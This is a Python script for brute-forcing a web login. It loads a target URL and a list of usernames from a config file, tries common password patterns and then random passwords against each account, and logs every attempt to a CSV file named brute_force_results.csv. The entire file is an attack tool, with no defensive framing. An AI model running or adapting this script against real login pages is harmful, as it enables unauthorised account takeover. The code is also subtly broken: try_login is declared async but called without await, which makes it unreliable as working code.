import json
import requests
import random
import time
import csv
from datetime import datetime

with open('config.json', 'r') as f:
    config = json.load(f)

login_url = config['loginUrl']
usernames = config['usernames']
characters = config['characters']
password_config = config['passwordConfig']

results = []

def generate_password(length):
    all_chars = characters['lowercase'] + characters['uppercase'] + characters['numbers'] + characters['special']
    password = ''
    for _ in range(length):
        password += random.choice(all_chars)
    return password

def generate_common_patterns(username):
    return [
        username,
        username + '123',
        username + '2023',
        username.lower() + '!',
        'P@ssw0rd',
        username[0].upper() + username[1:] + '123!',
        'Welcome123!',
        'Admin' + username[:3],
        'password123',
        'qwerty123',
        'letmein'
    ]

async def try_login(username, password, retry_count=0):
    try:
        response = requests.post(login_url, json={
            'username': username,
            'password': password
        }, headers={'Content-Type': 'application/json'}, allow_redirects=False)
        data = response.json()
        is_success = response.status_code == 200 and data.get('success', False)

        results.append({
            'username': username,
            'password': password,
            'status': 'success' if is_success else 'failure',
            'responseCode': response.status_code,
            'timestamp': datetime.utcnow().isoformat(),
            'error': ''
        })

        if is_success:
            return {'success': True, 'password': password}
        return {'success': False}
    except Exception as e:
        if retry_count < password_config['maxRetries']:
            time.sleep(2)
            return try_login(username, password, retry_count + 1)
        results.append({
            'username': username,
            'password': password,
            'status': 'error',
            'responseCode': getattr(e.response, 'status_code', 'N/A'),
            'timestamp': datetime.utcnow().isoformat(),
            'error': str(e)
        })
        return {'success': False}

def delay(ms):
    time.sleep(ms / 1000)

def save_results():
    with open('brute_force_results.csv', 'w', newline='') as f:
        writer = csv.DictWriter(f, fieldnames=['username', 'password', 'status', 'responseCode', 'timestamp', 'error'])
        writer.writeheader()
        writer.writerows(results)

def brute_force_login():
    for username in usernames:
        common_patterns = generate_common_patterns(username)
        all_passwords = common_patterns.copy()

        for _ in range(password_config['maxAttemptsPerUser'] - len(common_patterns)):
            length = random.randint(password_config['minLength'], password_config['maxLength'])
            all_passwords.append(generate_password(length))

        attempt_count = 0
        for password in all_passwords:
            attempt_count += 1
            result = try_login(username, password)
            if result['success']:
                break
            delay(password_config['delayMs'])

    save_results()

try:
    brute_force_login()
except Exception as e:
    save_results()